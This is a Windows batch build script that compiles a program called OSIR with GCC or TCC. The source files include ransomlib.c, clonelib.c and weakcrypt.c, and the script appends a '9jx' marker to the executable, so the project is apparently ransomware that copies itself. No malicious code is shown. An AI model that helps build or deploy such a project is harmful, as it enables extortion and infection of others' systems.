@echo off
REM You need to modify the TCC directory in
REM order to build OSIR. You must add the 
REM libraries in %LIBS% as well as add the
REM appropriate headers, which you can find
REM in the MINGW directory
REM
REM Run 'make gcc' or 'make g++' to test
REM build with GCC. Run 'make gcc -Os' or
REM the like to optimize.


REM build arguments
set INPUT=osir.c common\os.c common\web.c common\thirdparty\b64.c common\clonelib.c common\weakcrypt.c common\ransomlib.c common\crypt.c
set OUTPUT=osir.exe
set LIBS=-lws2_32 -ladvapi32


REM define the compilers
set GCC=gcc -s -std=c99 -Wall -Wextra -pedantic
set GPP=g++ -s -Wall -Wextra -pedantic
set TCC=tcc


REM set the compiler
set COMPILER=%TCC%
if "%1" == "gcc" (
	set COMPILER=%GCC%
)
if "%1" == "gccwno" (
	set COMPILER=gcc -s -std=c99
)
if "%1" == "tcc" (
	set COMPILER=%TCC%
)
if "%1" == "g++" (
	set COMPILER=%GPP%
)


REM build
set build=%COMPILER% %2 %INPUT% -o %OUTPUT% %LIBS%
echo %build%
%build%

REM add marker
echo 9jx >> %OUTPUT%
